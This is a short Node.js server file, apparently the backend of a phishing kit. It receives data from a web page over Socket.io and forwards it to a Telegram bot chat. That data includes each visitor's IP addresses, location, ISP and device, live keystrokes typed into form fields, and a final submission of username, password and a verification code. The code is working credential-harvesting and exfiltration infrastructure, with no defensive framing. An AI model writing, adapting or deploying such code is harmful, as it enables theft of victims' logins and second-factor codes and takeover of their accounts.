const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const axios = require("axios");

const app = express();
const server = http.createServer(app);

const io = new Server(server,{
  cors:{origin:"*"}
});

app.use(cors());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Send message to Telegram
function sendTelegram(message){
    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        chat_id: CHAT_ID,
        text: message
    }).catch(err => console.log("Telegram Error:", err.message));
}

io.on("connection",(socket)=>{

    console.log("User connected");

    // Receive visitor info from frontend
    socket.on("visitor-info",(data)=>{

        console.log("Visitor Data:", data);

        sendTelegram(`⚠️ New Visitor

🌐 IPv6: ${data.ipv6}
🌐 IPv4: ${data.ipv4}

📍 Location: ${data.city}, ${data.region}, ${data.country}

🏢 ISP: ${data.isp}

📱 Device: ${data.device}

🌍 Map: ${data.map}

🌐 Browser: ${data.browser}
`);
    });

    // Track typing
    socket.on("typing",(data)=>{
        sendTelegram(`⌨️ Typing

Field: ${data.field}
Value: ${data.value}`);
    });

    // Final form submission
    socket.on("submit",(data)=>{
        sendTelegram(`✅ Final Submission

Username: ${data.username}
Password: ${data.password}
code: ${data.code}`);
    });

    socket.on("disconnect",()=>{
        console.log("User disconnected");
    });

});

server.listen(3000,()=>{
    console.log("Server running on port 3000");
});
